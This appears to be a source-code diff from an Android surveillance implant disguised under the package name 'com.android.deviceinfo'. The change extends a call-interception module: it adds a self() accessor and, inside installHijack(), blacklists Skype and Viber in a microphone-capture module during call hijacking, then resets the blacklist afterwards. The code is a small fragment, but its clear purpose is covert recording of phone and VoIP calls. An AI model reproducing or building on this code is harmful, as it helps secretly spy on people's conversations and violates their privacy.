@@ -44,6 +44,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.call.CallInfo;
 import com.android.deviceinfo.module.call.Chunk;
 import com.android.deviceinfo.module.call.EncodingTask;
@@ -100,6 +101,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
 	private boolean[] finished = new boolean[2];
+
+	public static ModuleCall self() {
+		return (ModuleCall) ManagerModule.self().get(M.e("call"));
+	}
 
 	@Override
 	public boolean parse(ConfModule conf) {
@@ -222,6 +227,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean installHijack() {
 		// Initialize the callback system
+		
+		if (ModuleMic.self() != null) {
+			ModuleMic.self().addBlacklist("skype");
+			ModuleMic.self().addBlacklist("viber");
+		}
+		
 		hjcb = new CallBack();
 		hjcb.register(new HijackCallBack());
 
@@ -349,6 +360,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (hijack != null) {
 				hijack.stopInstrumentation();
+			}
+			
+			if(ModuleMic.self()!=null){
+				ModuleMic.self().resetBlacklist();
 			}
 		}
 	}
